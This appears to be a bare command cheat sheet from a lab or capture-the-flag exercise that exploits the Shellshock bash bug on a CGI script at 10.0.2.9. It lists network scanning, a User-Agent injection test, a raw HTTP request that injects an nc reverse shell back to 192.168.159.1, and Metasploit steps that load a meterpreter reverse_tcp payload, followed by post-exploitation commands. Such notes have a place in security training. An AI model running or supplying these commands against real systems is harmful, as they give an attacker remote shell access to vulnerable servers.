
## Commands 
- sudo arp-scan -local
- nmap -p- -sV 10.0.2.9
- wget -U "() { test;};echo \"Content-type: text/plain\"; echo; /bin/bash -c 'echo vulnerable'" http://10.0.2.9/cgi-bin/status
- echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80


## msfconsole
- search shellshock
- use exploit/multi/http/apache_mod_cgi_bash_env_exec
- set rhosts 10.0.2.9
- set TARGETURI /cgi-bin/status
- check
- show payloads
- set payload linux/x86/meterpreter/reverse_tcp
- exploit

### When inside
getuid
pwd
ifconfig
sysinfo
shell











